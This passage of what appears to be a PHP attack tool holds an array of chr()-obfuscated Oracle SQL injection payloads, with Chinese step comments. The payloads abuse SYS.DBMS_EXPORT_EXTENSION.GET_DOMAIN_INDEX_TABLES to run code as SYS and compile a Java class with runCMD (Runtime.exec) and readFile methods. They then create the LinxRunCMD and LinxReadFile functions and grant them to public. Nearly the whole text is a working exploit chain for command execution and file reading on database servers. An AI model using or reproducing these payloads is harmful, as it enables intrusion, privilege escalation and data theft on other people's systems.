chr(97)||chr(109)||chr(40)||chr(41)||chr(41)||chr(58)||chr(110)||chr(101)||chr(119)||chr(32)||chr(70)||chr(105)||chr(108)||chr(101)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(41)||chr(59)||chr(13)||chr(10)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(44)||chr(115)||chr(116)||chr(114)||chr(61)||chr(34)||chr(34)||chr(59)||chr(119)||chr(104)||chr(105)||chr(108)||chr(101)||chr(32)||chr(40)||chr(40)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(32)||chr(61)||chr(32)||chr(109)||
chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(114)||chr(101)||chr(97)||chr(100)||chr(76)||chr(105)||chr(110)||chr(101)||chr(40)||chr(41)||chr(41)||chr(32)||chr(33)||chr(61)||chr(32)||chr(110)||chr(117)||chr(108)||chr(108)||chr(41)||chr(32)||chr(115)||chr(116)||chr(114)||chr(32)||chr(43)||chr(61)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(43)||chr(34)||chr(92)||chr(110)||chr(34)||chr(59)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(99)||chr(108)||chr(111)||
chr(115)||chr(101)||chr(40)||chr(41)||chr(59)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(115)||chr(116)||chr(114)||chr(59)||chr(125)||chr(32)||chr(99)||chr(97)||chr(116)||chr(99)||chr(104)||chr(32)||chr(40)||chr(69)||chr(120)||chr(99)||chr(101)||chr(112)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(101)||chr(41)||chr(123)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(101)||chr(46)||chr(116)||chr(111)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(40)||chr(41)||chr(59)||chr(125)||chr(125)||chr(13)||chr(10)||chr(125)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0) from all_tables where rownum=1",	



//2.赋Java权限 2
"select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||
chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(32)||chr(32)||chr(13)||chr(10)||chr(99)||chr(114)||chr(101)||chr(97)||chr(116)||chr(101)||chr(32)||chr(111)||chr(114)||chr(32)||chr(114)||chr(101)||chr(112)||chr(108)||chr(97)||chr(99)||chr(101)||chr(32)||chr(97)||chr(110)||chr(100)||chr(32)||chr(99)||chr(111)||chr(109)||chr(112)||chr(105)||chr(108)||chr(101)||chr(32)||chr(106)||
chr(97)||chr(118)||chr(97)||chr(32)||chr(115)||chr(111)||chr(117)||chr(114)||chr(99)||chr(101)||chr(32)||chr(110)||chr(97)||chr(109)||chr(101)||chr(100)||chr(32)||chr(34)||chr(76)||chr(105)||chr(110)||chr(120)||chr(85)||chr(116)||chr(105)||chr(108)||chr(34)||chr(32)||chr(97)||chr(115)||chr(32)||chr(105)||chr(109)||chr(112)||chr(111)||chr(114)||chr(116)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(105)||chr(111)||chr(46)||chr(42)||chr(59)||chr(105)||chr(109)||chr(112)||chr(111)||chr(114)||chr(116)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(110)||chr(101)||chr(116)||chr(46)||chr(85)||chr(82)||chr(76)||chr(59)||chr(32)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||
chr(99)||chr(32)||chr(99)||chr(108)||chr(97)||chr(115)||chr(115)||chr(32)||chr(76)||chr(105)||chr(110)||chr(120)||chr(85)||chr(116)||chr(105)||chr(108)||chr(32)||chr(101)||chr(120)||chr(116)||chr(101)||chr(110)||chr(100)||chr(115)||chr(32)||chr(79)||chr(98)||chr(106)||chr(101)||chr(99)||chr(116)||chr(32)||chr(123)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(32)||chr(115)||chr(116)||chr(97)||chr(116)||chr(105)||chr(99)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(114)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(40)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(97)||chr(114)||chr(103)||chr(115)||chr(41)||chr(32)||chr(123)||chr(116)||chr(114)||chr(121)||chr(123)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(61)||chr(32)||chr(110)||chr(101)||chr(119)||chr(32)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(13)||chr(10)||chr(110)||chr(101)||chr(119)||chr(32)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||
chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(32)||chr(82)||chr(117)||chr(110)||chr(116)||chr(105)||chr(109)||chr(101)||chr(46)||chr(103)||chr(101)||chr(116)||chr(82)||chr(117)||chr(110)||chr(116)||chr(105)||
chr(109)||chr(101)||chr(40)||chr(41)||chr(46)||chr(101)||chr(120)||chr(101)||chr(99)||chr(40)||chr(97)||chr(114)||chr(103)||chr(115)||chr(41)||chr(46)||chr(103)||chr(101)||chr(116)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||chr(40)||chr(41)||chr(32)||chr(41)||chr(32)||chr(41)||chr(59)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(44)||chr(115)||chr(116)||chr(114)||chr(61)||chr(34)||chr(34)||chr(59)||
chr(119)||chr(104)||chr(105)||chr(108)||chr(101)||chr(32)||chr(40)||chr(40)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(32)||chr(61)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(114)||chr(101)||chr(97)||chr(100)||chr(76)||chr(105)||chr(110)||chr(101)||chr(40)||chr(41)||chr(41)||chr(32)||chr(33)||chr(61)||chr(32)||chr(110)||chr(117)||chr(108)||chr(108)||chr(41)||chr(32)||chr(115)||chr(116)||chr(114)||chr(32)||chr(43)||chr(61)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(43)||chr(34)||chr(92)||chr(110)||chr(34)||chr(59)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(99)||chr(108)||chr(111)||chr(115)||chr(101)||chr(40)||chr(41)||chr(59)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(115)||chr(116)
||chr(114)||chr(59)||chr(125)||chr(32)||chr(99)||chr(97)||chr(116)||chr(99)||chr(104)||chr(32)||chr(40)||chr(69)||chr(120)||chr(99)||chr(101)||chr(112)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(101)||chr(41)||chr(123)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(101)||chr(46)||chr(116)||chr(111)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(40)||chr(41)||chr(59)||chr(125)||chr(125)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(32)||chr(115)||chr(116)||chr(97)||chr(116)||chr(105)||chr(99)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(114)||chr(101)||chr(97)||chr(100)||chr(70)||chr(105)||chr(108)||chr(101)||chr(40)||chr(83)||chr(116)||chr(114)||chr(105)||
chr(110)||chr(103)||chr(32)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(123)||chr(116)||chr(114)||chr(121)||chr(123)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(61)||chr(32)||chr(110)||chr(101)||chr(119)||chr(32)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||
chr(100)||chr(101)||chr(114)||chr(40)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(46)||chr(115)||chr(116)||chr(97)||chr(114)||chr(116)||chr(115)||chr(87)||chr(105)||chr(116)||chr(104)||chr(40)||chr(34)||chr(104)||chr(116)||chr(116)||chr(112)||chr(34)||chr(41)||chr(63)||chr(110)||chr(101)||chr(119)||chr(32)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(110)||chr(101)||chr(119)||chr(32)||chr(85)||chr(82)||chr(76)||chr(40)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(46)||chr(111)||chr(112)||chr(101)||chr(110)||chr(83)||chr(116)||chr(114)||chr(101)||
chr(97)||chr(109)||chr(40)||chr(41)||chr(41)||chr(58)||chr(110)||chr(101)||chr(119)||chr(32)||chr(70)||chr(105)||chr(108)||chr(101)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(41)||chr(59)||chr(13)||chr(10)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(44)||chr(115)||chr(116)||chr(114)||chr(61)||chr(34)||chr(34)||chr(59)||chr(119)||chr(104)||chr(105)||chr(108)||chr(101)||chr(32)||chr(40)||chr(40)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(32)||chr(61)||chr(32)||chr(109)||
chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(114)||chr(101)||chr(97)||chr(100)||chr(76)||chr(105)||chr(110)||chr(101)||chr(40)||chr(41)||
chr(41)||chr(32)||chr(33)||chr(61)||chr(32)||chr(110)||chr(117)||chr(108)||chr(108)||chr(41)||chr(32)||chr(115)||chr(116)||chr(114)||chr(32)||chr(43)||chr(61)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(43)||chr(34)||chr(92)||chr(110)||chr(34)||chr(59)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(99)||chr(108)||chr(111)||chr(115)||chr(101)||chr(40)||chr(41)||chr(59)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(115)||chr(116)||chr(114)||chr(59)||chr(125)||chr(32)||chr(99)||
chr(97)||chr(116)||chr(99)||chr(104)||chr(32)||chr(40)||chr(69)||chr(120)||chr(99)||chr(101)||chr(112)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(101)||chr(41)||chr(123)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(101)||chr(46)||chr(116)||chr(111)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(40)||chr(41)||chr(59)||chr(125)||chr(125)||chr(13)||chr(10)||chr(125)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0) from all_tables where rownum=1",


//3.创建函数 3
"select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),
chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||
chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||
chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(99)||chr(114)||chr(101)||chr(97)||chr(116)||chr(101)||chr(32)||chr(111)||chr(114)||chr(32)||chr(114)||chr(101)||chr(112)||chr(108)||chr(97)||chr(99)||chr(101)||chr(32)||chr(102)||chr(117)||chr(110)||chr(99)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(76)||chr(105)||chr(110)||chr(120)||chr(82)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(40)||chr(112)||chr(95)||chr(99)||chr(109)||chr(100)||chr(32)||chr(105)||
chr(110)||chr(32)||chr(118)||chr(97)||chr(114)||chr(99)||chr(104)||chr(97)||chr(114)||chr(50)||chr(41)||chr(32)||chr(32)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(118)||chr(97)||chr(114)||chr(99)||chr(104)||chr(97)||chr(114)||chr(50)||chr(32)||chr(32)||chr(97)||chr(115)||chr(32)||chr(108)||chr(97)||chr(110)||chr(103)||chr(117)||chr(97)||chr(103)||chr(101)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(32)||chr(110)||chr(97)||chr(109)||chr(101)||chr(32)||chr(39)||chr(39)||chr(39)||chr(39)||chr(76)||chr(105)||chr(110)||chr(120)||
chr(85)||chr(116)||chr(105)||chr(108)||chr(46)||chr(114)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(40)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(108)||chr(97)||chr(110)||chr(103)||chr(46)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(41)||chr(32)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(39)||chr(39)||chr(39)||chr(39)||chr(59)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0) from all_tables where rownum=1",

//3.创建函数 4
"select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||
chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(32)||chr(32)||chr(32)||chr(32)||chr(13)||chr(10)||chr(99)||chr(114)||chr(101)||chr(97)||chr(116)||chr(101)||chr(32)||chr(111)||chr(114)||chr(32)||
chr(114)||chr(101)||chr(112)||chr(108)||chr(97)||chr(99)||chr(101)||chr(32)||chr(102)||chr(117)||chr(110)||chr(99)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(76)||chr(105)||chr(110)||chr(120)||chr(82)||chr(101)||chr(97)||chr(100)||chr(70)||chr(105)||chr(108)||chr(101)||chr(40)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(32)||chr(105)||chr(110)||chr(32)||chr(118)||chr(97)||chr(114)||chr(99)||chr(104)||chr(97)||chr(114)||chr(50)||chr(41)||chr(32)||chr(32)||chr(114)||chr(101)||
chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(118)||chr(97)||chr(114)||chr(99)||chr(104)||chr(97)||chr(114)||chr(50)||chr(32)||chr(32)||chr(97)||chr(115)||chr(32)||chr(108)||chr(97)||chr(110)||chr(103)||chr(117)||chr(97)||chr(103)||chr(101)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(32)||chr(110)||chr(97)||chr(109)||chr(101)||chr(32)||chr(39)||chr(39)||chr(39)||chr(39)||chr(76)||chr(105)||
chr(110)||chr(120)||chr(85)||chr(116)||chr(105)||chr(108)||chr(46)||chr(114)||chr(101)||chr(97)||chr(100)||chr(70)||chr(105)||chr(108)||chr(101)||chr(40)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(108)||chr(97)||chr(110)||chr(103)||chr(46)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(41)||chr(32)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(83)||
chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(39)||chr(39)||chr(39)||chr(39)||chr(59)||chr(32)||chr(32)||chr(32)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0) from all_tables where rownum=1",

//4.赋public执行函数的权限 5
"select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),
chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||
chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||
chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||
chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(103)||chr(114)||chr(97)||chr(110)||chr(116)||chr(32)||chr(97)||chr(108)||chr(108)||chr(32)||chr(111)||chr(110)||chr(32)||chr(76)||chr(105)||
chr(110)||chr(120)||chr(82)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(32)||chr(116)||chr(111)||chr(32)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0) from all_tables where rownum=1",
	

//4.赋public执行函数的权限 6
"select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||
chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(103)||chr(114)||chr(97)||chr(110)||chr(116)||chr(32)||chr(97)||chr(108)||chr(108)||chr(32)||chr(111)||chr(110)||chr(32)||chr(76)||chr(105)||chr(110)||chr(120)||chr(82)||chr(101)||chr(97)||chr(100)||chr(70)||
chr(105)||chr(108)||chr(101)||chr(32)||chr(116)||chr(111)||chr(32)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0) from all_tables where rownum=1",
	
	
	);
}
?>

